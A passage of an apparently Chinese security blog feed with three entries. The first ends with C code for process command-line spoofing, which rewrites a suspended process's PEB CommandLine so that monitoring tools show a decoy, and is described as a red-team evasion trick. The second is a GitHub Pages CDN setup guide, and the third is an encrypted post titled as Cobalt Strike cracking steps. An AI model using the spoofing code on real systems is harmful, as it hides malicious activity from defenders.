     <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span>CMD_TO_SHOW<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        FALSE<span class="token punctuation">,</span>        CREATE_SUSPENDED <span class="token operator">|</span> CREATE_NEW_CONSOLE<span class="token punctuation">,</span>        <span class="token constant">NULL</span><span class="token punctuation">,</span>        <span class="token string">"C:\\Windows\\System32\\"</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>si<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call CreateProcess\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Retrieve information on PEB location in process</span>    NtQueryInformationProcess2 ntpi <span class="token operator">=</span> <span class="token punctuation">(</span>NtQueryInformationProcess2<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtQueryInformationProcess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ntpi</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        ProcessBasicInformation<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>pbi<span class="token punctuation">,</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pbi<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span>retLen    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Read the PEB from the target process</span>    success <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> pbi<span class="token punctuation">.</span>PebBaseAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pebLocal<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PEB<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call ReadProcessMemory to grab PEB\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Grab the ProcessParameters from PEB</span>    parameters <span class="token operator">=</span> <span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">readProcessMemory</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        pebLocal<span class="token punctuation">.</span>ProcessParameters<span class="token punctuation">,</span>        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">300</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Set the actual arguments we are looking to use</span>    WCHAR spoofed<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> CMD_TO_EXEC<span class="token punctuation">;</span>    success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> parameters<span class="token operator">-</span><span class="token operator">></span>CommandLine<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>spoofed<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>spoofed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call WriteProcessMemory to update commandline args\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////</span>    <span class="token comment" spellcheck="true">// Update the CommandLine length (Remember, UNICODE length here)</span>    DWORD newUnicodeLen <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span>    success <span class="token operator">=</span> <span class="token function">writeProcessMemory</span><span class="token punctuation">(</span>        pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pebLocal<span class="token punctuation">.</span>ProcessParameters <span class="token operator">+</span> <span class="token function">offsetof</span><span class="token punctuation">(</span>RTL_USER_PROCESS_PARAMETERS<span class="token punctuation">,</span> CommandLine<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>newUnicodeLen<span class="token punctuation">,</span>        <span class="token number">4</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>success <span class="token operator">==</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Could not call WriteProcessMemory to update commandline arg length\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Resume thread execution*/</span>    <span class="token function">ResumeThread</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="ÊÄùËÄÉ"><a href="#ÊÄùËÄÉ" class="headerlink" title="ÊÄùËÄÉ"></a>ÊÄùËÄÉ</h2><p>ÂêåËøôÁØáÊñáÁ´†‰∏ÄËµ∑ÁöÑËøòÊúâ<a href="https://blog.nviso.eu/2020/01/31/the-return-of-the-spoof-part-1-parent-process-id-spoofing/" target="_blank" rel="noopener">Áà∂ËøõÁ®ãIDÊ¨∫È™ó</a>ÔºåËøô‰∏§‰∏™ÊâãÊÆµÁªìÂêà‰∏ÄËµ∑ÁîüÊàê‰∏Ä‰∏™ÊòìÁî® exe Â∫îËØ•ÊòØÂæàÊúâÊïàÁöÑÁ∫¢ÈòüÊâãÊÆµÔºåÊØîÂ¶ÇÈöèÊú∫ÁîüÊàê‰º™Ë£ÖÂëΩ‰ª§„ÄÅËá™Âä®‰º™Ë£ÖÔºåËøôÊ†∑Âú®Êù•‰∏çÂèäÊ∏ÖÁêÜÂéÜÂè≤ËÆ∞ÂΩïÁöÑÊÉÖÂÜµ‰∏ã‰πüËÉΩÂª∂ÁºìËìùÈòüÁöÑÊ≠•‰ºê‚Ä¶</p><p>‰ΩÜÊòØÂ•à‰Ωï‰∏ç‰ºö c++ÔºåÂÖàÁïô‰∏™Âùë</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/" target="_blank" rel="noopener">How to Argue like Cobalt Strike</a></li><li><a href="https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/" target="_blank" rel="noopener">The return of the spoof part 2: Command line spoofing</a></li><li><a href="youtube.com/watch?v=l8nkXCOYQC4">Red Teaming in the EDR age</a></li><li><a href="http://journal.seu.edu.cn/oa/pdfdow.aspx?Sid=201301005" target="_blank" rel="noopener">Âü∫‰∫éÁõ¥Êé•ÂÜÖÊ†∏ÂØπË±°Êìç‰ΩúÁöÑËøõÁ®ã‰º™Ë£Ö‰øùÊä§ÊñπÊ≥ï</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Á™ÅÁÑ∂Â•ΩÂ•á argue ÂéüÁêÜÔºå‰∫éÊòØÊúâ‰∫ÜÊ≠§Êñá&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="cobaltstirke" scheme="https://blog.sari3l.com/tags/cobaltstirke/"/>
    
  </entry>
  
  <entry>
    <title>Github Page Âä†ÈÄü</title>
    <link href="https://blog.sari3l.com/posts/afd91327/"/>
    <id>https://blog.sari3l.com/posts/afd91327/</id>
    <published>2020-08-01T16:54:48.000Z</published>
    <updated>2020-08-05T11:24:19.935Z</updated>
    
    <content type="html"><![CDATA[<p>‰ªäÂ§©ÂÆûÂú®Ë¢´ github page ÁöÑÂä†ËΩΩÈÄüÂ∫¶ÊÅ∂ÂøÉÂà∞‰∫ÜÔºåÊµãËØï‰∫ÜÂá†‰∏™CDNÊïàÊûúÔºåËôΩÁÑ∂ÊúâÂÖçË¥πÊµÅÈáèÁ≠âÊ¥ªÂä®ÔºåÊÄªÊÑüËßâË¢´Êî∂Ââ≤‰∫Ü‰ªÄ‰πà</p><p>‰∏≠Èó¥ÊµãËØï‰∫Ü netlifyÔºåÂºÄÂßãÂØπÂÆÉÈÄüÂ∫¶‰∏çÊòØÂæàÊª°ÊÑèÔºå‰ΩÜ‰πãÂêéÊµãËØï‰∫ÜÂá†‰∏™ËøòÊòØÂõûÂà∞‰∫ÜÂÆÉÔºåOrz</p><p>ÊúÄÁªàÈÖçÂêàÂà©Áî®ÂêÑÁßçÊâãÊÆµËøòÁÆóÊòØËææÂà∞‰∫ÜÊî∂Ë¥π CDN ÁöÑÊïàÊûú(ÊúâÈ°πÁõÆ‰ΩìÈáèÈôêÂà∂)ü§£</p><p><strong>Âª∫ËÆÆjsdelivrÂè™ÂÅö JS„ÄÅCSS Âä†ÈÄüÂ∞±Â•ΩÔºåÊØïÁ´üÂ•ΩÁî®ÁöÑÂÖ¨ÂÖ±Â∫ìÁî®‰∏Ä‰∏™Â∞ë‰∏Ä‰∏™</strong></p><ol><li>netlify - ËµÑÊ∫êÊâòÁÆ°„ÄÅcdn Âä†ÈÄü</li><li>cloudflare - cdn Âä†ÈÄü</li><li>lazyload - ÂõæÁâáÂºÇÊ≠•Âª∂ËøüÂä†ËΩΩ</li><li>jsdelivr - ÈùôÊÄÅËµÑÊ∫êÂä†ÈÄü</li></ol><h2 id="1-Netlify"><a href="#1-Netlify" class="headerlink" title="1. Netlify"></a>1. Netlify</h2><ol><li><p>ÈÄâÊã©ËÆøÈóÆ github ‰ªìÂ∫ì</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962888273340.jpg" alt="-w1241"></p></li><li><p>ÈÄâÊã© github page È°πÁõÆ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962967632283.jpg" alt="-w1246"></p></li><li><p>Âõ†‰∏∫‰∏ä‰º†Ëá≥github page‰∏∫ÈùôÊÄÅÈ°µÈù¢‰∏çÈúÄË¶ÅÁºñËØëÔºåËøôÈáåÈÄâÊã©Áõ¥Êé•ÈÉ®ÁΩ≤Âç≥ÂèØ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962968325497.jpg" alt="-w1238"></p></li><li><p>ÈÖçÁΩÆ netlify ÂüüÂêçËß£Êûê</p><p> ËøôÈáåÊ≠£Â∏∏ÊÉÖÂÜµ primary domain Â∫î‰∏∫ÁªøËâ≤Ë°®Á§∫<code>Ê≠£Â∏∏Áä∂ÊÄÅ</code>Ôºå‰ΩÜÁî±‰∫éÂºÄÂêØ‰∫Ü cloudflare cdn ÂØºËá¥ DNS Ê£ÄÊµãÂºÇÂ∏∏ÔºåÊ£ÄÊµãËÉΩÊ≠£Â∏∏ËÆøÈóÆÂøΩÁï•Ê≠§Ë≠¶Âëä</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962974152636.jpg" alt="-w1222"></p></li><li><p>ÈÖçÁΩÆSSL/TLSËØÅ‰π¶</p><p> Áî±‰∫éÊàëÂú® Netlify ÂâçÈù¢‰ΩøÁî® CloudFlare CDNÔºåÊâÄ‰ª•ÈúÄË¶ÅÈÖçÂêà CF ËøõË°åËØÅ‰π¶ËÆ§ËØÅÔºåÈùû CF ÂèØ‰ª•Â∞ùËØïÂè≥ËæπÁöÑ<code>Let&#39;s Encrypt</code>ËØÅ‰π¶ÔºàËøôÈáåÊàëÂ∑≤ÁªèÊ∑ªÂä†‰∫ÜËØÅ‰π¶ÔºåÊâÄ‰ª•ÈÄâÊã©Êõ¥Êñ∞Ëá™ÂÆö‰πâÂÜÖÂÆπËØÅ‰π¶Ôºâ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962977185708.jpg" alt="-w957"></p><p> i. ÂÖàÂú® CF ÂàõÂª∫<code>Ê∫êËØÅ‰π¶</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962979813348.jpg" alt="-w1086"></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962980996211.jpg" alt="-w825"></p><p> ii. ‰πãÂêéÁîüÊàê PEM Ê†ºÂºèÂØÜÈí•ÔºåËÆ∞ÂΩïÊ∫êËØÅ‰π¶‰∏∫ 1ÔºåÁßÅÈí•‰∏∫ 2</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962981679521.jpg" alt="-w819"></p><p> iii. ËÆøÈóÆ<a href="https://support.cloudflare.com/hc/zh-cn/articles/115000479507" target="_blank" rel="noopener">Ê≠§È°µÈù¢(ÁÆ°ÁêÜ Cloudflare Origin CA ËØÅ‰π¶)</a>ÔºåËÆ∞ÂΩïÊ†πËØÅ‰π¶‰∏∫ 3</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962983204747.jpg" alt="-w894"></p><p> iv. ÂõûÂà∞ NetlifyÔºåÊåâ‰∏äÈù¢ÂØπÂ∫îÂ∫èÂè∑Â°´ÂÜôËØÅ‰π¶ÂÜÖÂÆπÂêé‰øùÂ≠ò</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962977767693.jpg" alt="-w638"></p></li></ol><h2 id="2-CloudFlare"><a href="#2-CloudFlare" class="headerlink" title="2. CloudFlare"></a>2. CloudFlare</h2><ol><li><p>ÈÖçÁΩÆ CNAME ÊåáÂêë Netlify Ëá™ÂÆö‰πâÂüüÂêçÔºåÂπ∂ÂºÄÂêØ CDN Âä†ÈÄü</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962987471338.jpg" alt="-w1038"></p></li><li><p>ÈÄâÊã©Âä†ÂØÜÊ®°Âºè‰∏∫<code>ÂÆåÂÖ®</code>Êàñ<code>ÂÆåÂÖ®Ôºà‰∏•Ê†ºÔºâ</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962988163771.jpg" alt="-w1065"></p></li><li><p>ÂºÄÂêØ<code>Always HTTPS</code>Âíå <code>HSTS</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962988791773.jpg" alt="-w1047"></p></li></ol><h2 id="3-lazy-load"><a href="#3-lazy-load" class="headerlink" title="3. lazy load"></a>3. lazy load</h2><p>È°πÁõÆÂú∞ÂùÄÔºö<a href="https://github.com/Troy-Yang/hexo-lazyload-image" target="_blank" rel="noopener">https://github.com/Troy-Yang/hexo-lazyload-image</a></p><p>ÊåâÊñáÊ°£ÂÆâË£Ö„ÄÅÈÖçÁΩÆÂç≥ÂèØ</p><pre class=" language-shell"><code class="language-shell">$ npm install hexo-lazyload-image --save</code></pre><h2 id="4-jsdelivr"><a href="#4-jsdelivr" class="headerlink" title="4. jsdelivr"></a>4. jsdelivr</h2><p><strong>Áî±‰∫éjsdelivrËá™Â∏¶ 50M È°πÁõÆÈôêÂà∂ÔºåÊâÄ‰ª•ÂÖ®Â±ÄÂä†ÈÄüÊòØ‰∏çÁé∞ÂÆûÁöÑÔºàÊ≠§Â§ÑÈ°πÁõÆËæÉÂ∞èÁöÑÂèØ‰ª•ÂÖ®Â±Ä‰ΩøÁî®ÔºâÔºåÂª∫ËÆÆÂè™Âä†ÈÄü JS„ÄÅCSS Âç≥ÂèØÔºå‰∏ãÈù¢Âè™ÂÅöÁêÜËÆ∫‰ªãÁªç</strong></p><p>ÂÆòÁΩëÔºö<a href="https://www.jsdelivr.com/?docs=gh" target="_blank" rel="noopener">https://www.jsdelivr.com/?docs=gh</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962991108849.jpg" alt="-w1171"></p><ol><li><p>Áî±‰∫éÊàëÈÖçÁΩÆ‰∫Ü hexo-lazyload-imageÔºåÊâÄ‰ª•Áõ¥Êé•Á≤óÊö¥ÁöÑ‰øÆÊîπÊ∫êÁ†ÅÔºàËøôÈáåÂè™ÂØπÂ∫î posts ÊñáÁ´†ÂÜÖÁöÑÈùôÊÄÅËµÑÊ∫êÔºâÔºå‰ª£‰ª∑Â∞±ÊòØÊú¨Âú∞ÊµãËØïÊ≤°Ê≥ïÂä†ËΩΩÂõæÁâáÔºåÊúâËÉΩÂäõÁöÑÂèØ‰ª•ÂÜô‰∏™ÊµãËØïÂíåÂèëÂ∏ÉÂàÜÂà´Âä†ËΩΩ‰∏çÂêåÂú∞ÂùÄÂç≥ÂèØ</p><p> ‰ΩçÁΩÆÔºö<code>&lt;blog_path&gt;/node_modules/hexo-asset-image/index.js</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962992328798.jpg" alt="-w1087"></p></li><li><p>ÂØπÂ∫îÂÖ∂‰ªñÈùôÊÄÅÊñá‰ª∂ÔºåÂ¶ÇÂ§¥ÂÉè„ÄÅ‰∫åÁª¥Á†ÅÁ≠âÔºåÁõ¥Êé•‰øÆÊîπÊàêÁªùÂØπÂú∞ÂùÄÂç≥ÂèØÔºà‰∏çÂà©‰∫éÈïøÊúüÁª¥Êä§Ôºâ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962997100660.jpg" alt="-w692"></p></li></ol><p>P.S. ÂÖ∂ÂÆûÂèØ‰ª•Ëá™ÂÆö‰πâÂú® config ‰∏≠Ëá™ÂÆö‰πâ‰∏Ä‰∏™ÂºÄÂÖ≥ÂíåÂä†ËΩΩË∑ØÂæÑÊñπ‰æøÊú™Êù•Áª¥Êä§ÔºåËøôÈáåÊúâÊèí‰ª∂<a href="https://www.npmjs.com/package/hexo-cdn-jsdelivr" target="_blank" rel="noopener">hexo-cdn-jsdelivr</a>ÂÆûÁé∞ÔºåÊú¨Âú∞ÊµãËØïÊ≤°ÊúâÈóÆÈ¢ò‰ΩÜÊòØgenerateÊó∂ÊÄª‰ºöÂá∫ÈîôÔºåÂèØËÉΩÂíåÂÖ∂‰ªñÊèí‰ª∂ÊúâÂÜ≤Á™ÅÔºåÊàëÊöÇÊó∂Ê≤°ÊúâÂéª‰ªîÁªÜÁ†îÁ©∂</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://blog.ops-coffee.cn/s/11-yhyohtdsbl9ffnvcs6w" target="_blank" rel="noopener">https://blog.ops-coffee.cn/s/11-yhyohtdsbl9ffnvcs6w</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Âø´Âø´Âø´ÔºåÂÜ≤ÂÜ≤ÂÜ≤~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Á†¥Ëß£Ê≠•È™§</title>
    <link href="https://blog.sari3l.com/posts/76ce816c/"/>
    <id>https://blog.sari3l.com/posts/76ce816c/</id>
    <published>2020-07-31T02:51:55.000Z</published>
    <updated>2020-08-04T09:29:03.116Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="74bf7c74f19487e94d2590775d226ded1355b2ff5113380d34592df650af83b0">25c086d7f73d8c412b0702a54b3a871add5d8bba583d5821da488bb6b5464f423faadd3ead048eae55b1e68362f2e6fda1d39b15929956c73dfd0c64c587b59fc5a1526b2f7e3f0503d391c8857e876146d7a1c4e304c8a5b637763b4ceb3159e0d8b648659493e0f6fafa9c57c286eac145df3a304fa443f28bb7498722a44fb600342d3eb0517cb71bc2d5f8ccf0e43e603bae2ee46948fa3e5f179159bd43c98108726f609c8f073dde232c714e33b9232bb19697c4e9f2b036e0dae80e174478a9d783dc911f001c99d9e6773cc1be577ec0365b41dd136a5658fb3cb9159f0d81e859f228dc8ce0cba639b5449831e0423b7df97d29c61fcd1074c7e01000ef34cd39ab483f2c4db1162ad82372ccb694e351de77f5182c2f1ce714f11fe054adb636da77b94f1a2d5a10596548cc6340b7d243e514aa4205bf34c239d3a608b949e444ca7a8be0ccffe4245cb72595a2b6dfd59458655262b37e1f55e3f22f96c0f51bebbaf64fc0e4652e9de0d3692c6ec3bbdc42f5a13d89f474263360cb065fe474ff45a50003c8dbdc6c2565740493ec887523dea3b6474efea86b9df3fb69f07f28d6b8052fb856a2e2ef8e04746f936b335381357763045a605ffabb4c6eea7b782ff078d5c9e83e07740a17aa196d83d8d69951d4bd6d36fbec2e1983ce2ad319dda55d8ae904022782e850b037890138ee1eb225c33dc4908a479496c84c9bb204127c353827eadc496a91224a6cb071822f2587d899dad9a99047eb2da6b4066d9ed72613c057cb4a6b5c4d9fd6ce601a85919cd015216d70595708122123cafcc13f91294458561b1e57a418eb38b2cc0b8f11f7afd75b4354fafa4ac46ae063fe88279f6fa9904239a8180c4ecb2b85736237bc7fa357020dbef8a1b633a763785b648ca7ac8427b30b1892b1e895fddce12264ae2588f030806f8ea8ced90fe00e43842fcaf3fab9dcd16ee8083892ad390580b4f6af9eac6c69bc361fb0486ccb7a165f651ed39ed37cca2e7ee129d9c1ea5615489b10eea8cd416996c997c31c21ca4b782de72e076c731456e2435e4a951d0e0a2003f751831bce0364250c057d03e078a177265733aadad5c43c4f11c919523b5874e15a6a67e4e1908853312204efbeda8d777416c5678799242cadf11d9fab0ffa0e6d1ac5570df8c3e7389675414ddcb01ec563c12cec62386132f478656bce8e85b67f18aac8ba87a2d1f39a71a77efeadc7dfae19755a43df1be5a928a8fcc6a94c29eeaf562ce932f0990661706fe58a1e2051eaab0285dbfbfc51046cd5e5b9b02f09a045b775fd4da393c053f6e840f5a1e7f44dc56457f740ff23f6a1120eb4b6d169d0dea2ef05809007c5f8e510f415d5219d541e275db40d246585ef25ff590a6ee9fb84a5a68604e0f7d7c36ffeb16873ab4e62251d6e296338ac0c43adb61c3aad42265bde2f7d3d545b2e43053ec5be943cbf5a20d0e7b5f81c63d8b8bf8d0073106b28ee691095b97f44e89c9011e6444feda1ca6c96a24ebd3a9b327d747246e9c37538e533678f7fee16d28317fb5476db4c1ff8044d5c30f4c0dbd56cfea535e11d1c2f4228f18066e3cac1bbae8d52716bbb94e1cf02ef803f4d29c1ec36af0965be836ed60da284ffee01126f5b4730d75c981750f850f1ae1b9c759b0120556734dcddff443f5e5a587e1e691d84357ce9a282552f889a8068835106b1eb5efcedd2d37365011e65d48849c5149c4207e21aa966b06a8bfd6d3ce04930e7fecb0e0456de995da4ee835d0756e8237325d9890613b9845ac6b37ac17a99ad9c912872245e6f46b17dcbbcc7646161f334b7e747e5fab3af584457eeb557f09c173c3de07dd5409236a903220800d6fd103c9e2f1343149f2870cd02fd5064439c725a33013c0f4776ce2413a36278f2a07be8b9737e198c0fff86042874b732ab3698d7f3b20f5ad2fa172d1874dbb872c667beb22bba0bfb1c42eb4f9ced4240f4c7e19835ece7ff1b7328e54c7929c998db99ef4df5dec1748581ddf0e497c7aed17acfd4b48eee78b0f8f73c9c25c76e95b0212809c6ae78733fe45cc5c5b02b12f06a5bed60c5ecbbbe97a57564361744dc3917b0eb892aaaf785579305e3629b01b8cd62f7d84c38db138d7c98a7a4aeac2e4440b2f07f801e00f4cc592c5f876fe7dc76d6c832c66160cc469df6b0687ad61cbcf229e26c2b543b26880eca921ea81057cdfa79ab2353f6ecb342de9a442cdafee367e45404a427f63cb8f886ca4dafb36e2f72c96ae6f0fad29b144a4e5cbeb4c1e4beb0cbd5f879a639becc19c1352b3200f46bf8fd485d9ee17d6893ec4e53edf3138f275a4d2d59c29527170e5655e596a71de758c231860abe7fca66db1d0e8753a72e1fdd046ad4bda10fa59c4cdf4945919bfc17c6f66b7e7013b192de256dd93b3a1459927bb3d1203f2e50eba0ec2f8119ec087cb73f705020eb5f1b2f3ee301d1b6fc9dccfbfdc0b1e009041295ea3eb7c74f1b06186900074586391e52fb39b8507fc599633925a666b5119e8e493b2f7940e2e9e7ef58b21f5256a4a54080a3ee7a8eacdaece06919dd088185c83ed758aa865b86d05a67247d8a5ef7ef896e837842a31791b7ffc23cebceb826ed3ab89dbaf3845f6d48b0a0d18f7183f32f2c5329e8d42368d19aea87c97370a1515094e45e29ea9282b772ec3be42be25425f7a320d76c0a4f0f22dd733cf843bb63056829fa90696deaa1e7c2a3d5ec4a9bd36bf245bcdf9dffc6f7793cbbfc0fcf387ac1b37abae61a7566687f75b2b3a742a18d13e0b085360b10e38914e01481067f865f4e3ab7b651fb204eb4fe201358df93bd122ec71cfabe77f025f7c3db130de12d1de8a68b61c061b8f62a7f032e839cebae260972347b654cec7567f73888c2b3f1daf4367d22a4bc2512b0984b6bec6f7f18f2e968196856704d4d23e78f9f38f35b49e4bd82af98d225021c1ab6a6b290d1a91cf1e1309e42553d4b8dda7e2d83d04270ccd3b31663e73cf99c698f85a53886380922808f5e042552f453d1cd8835d54f7971744cb56968482804839bd1490e6a6c4e4b2c11f51bf3e1cde8320ee9d679a6256430519a37d014a96d20e41ca106cd0e495ffd3e187a6f464722765aa9b2fc595ff11b671dfea7744b4819c1685f3b387c7c149428f81d4df5c9ad0ab3aae46ed1c156c867b741bb3b1b43dbb91ea18fcdfe9412125c95312449d7813614d3764cef942db13c16210acce83caf69b918305820bd61573d62c842deec9298d4ca00d1018d9eb9dd4e09c5af7b5a43ed053f6efe25ef34c3e1286f99a60530446a89a34a5469b61b2c9cefd1f6cd166696ef9cd2f4235ab28bd3c64cd6ca72ba0d1d9a9d1c10a28ca236a2414817a287bfecc85fe549d69b6017a79045f130d748fd970ad05170c5d3a008bd7f62122d6cd9dffe7715ca099c47aab0f7226538c6a254c6983776d020ba4597398ebecf6d5df2c76f3c503990e2e6b172b2a3a77468c3bc48e7930055ba665309b39e64f7aa171c1219dc343413c300bc65b9df326f29d4bfb475a080561c37392404f7fc40ea3e1b7e8edad1861341a3324c432f147f440ee3cf05f05ffbc63e377edc768622fd21b3ce1bf5e51833bd9fa008b3119a115188998fce3a01b07e026eb0c5d754631c05c0e02fd830f8be4e70d3b8e82bfd31796e536a6d1456a1c0bb4354b3d5b130b8a7511017e82269e530e65ecf9fb6c57c6ac7cda23c7bdc5c3b5c4e8a58a1567ff14eec1ef706a243808d394d74827c33584b77f8def9e33ff96acaf3105f9673f4b769cd224a98b967497ef828cbeb8b1bb1ba0a924a63f8d1eb91af375b6852fce2bb9df945bd3ae0a8a66692fd26cf7c5879a06024392d50c901e3c531b413114fb0b9baa1a0d77a47538419089295c0ef23acec4f271e3525fb7b829718f95ac01c6f6be52b19ab03e594eaf363b6a7c23cc44ee06901e48f90fa094fdd79e41f2b4c0527016f469e388fc24df8370b3ea1982a41b31f4e5108334a4b7ebfead3929da426f4f262d614d7118d09893772be6b91d019d2a4fe4c1d9f9145f3223568a4b065990db714f8844bc65f8c97ad8e68e4367470b9ae228a2b95f57f443fe3c32b85b766f5a45bd93d93ca571f01dd7b7d0158342d40f9769f6d3c9c86